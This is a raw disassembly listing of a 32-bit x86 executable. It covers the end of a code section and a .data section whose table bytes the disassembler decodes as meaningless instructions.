  411a98:	dec    esi
  411a99:	loopne 0x411b0c
  411a9b:	inc    edi
  411a9c:	out    0x3,al
  411a9e:	shr    ecx,0xd
  411aa1:	add    BYTE PTR [eax],al
  411aa3:	add    BYTE PTR [ebx+0x5435fc45],cl
  411aa9:	or     BYTE PTR [ecx+0x7],dl
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    ah,dl
  412425:	cmp    al,BYTE PTR [ebx]
  412427:	add    ah,dl
  412429:	sub    al,BYTE PTR [ebx]
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
